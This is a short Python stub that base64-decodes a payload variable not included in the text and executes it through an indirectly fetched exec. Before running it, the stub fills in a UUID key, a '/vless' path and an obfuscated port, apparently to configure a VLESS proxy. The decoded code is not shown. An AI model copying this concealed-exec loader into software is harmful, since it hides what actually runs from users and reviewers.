import sys
from base64 import b64decode

sys.__std__ = __builtins__
__builtins__.getattr(sys.__std__, "exec")(
    b64decode(_).decode("utf8").replace(str(int("0o17620", 8)), str(8080))
    .replace("__key__", "fec78964-3c7b-4984-9d56-6a4b571c3773")
    .replace("__vl__", "/vless")
    .replace("__vm__", "")
    .replace("__tr__", "")
)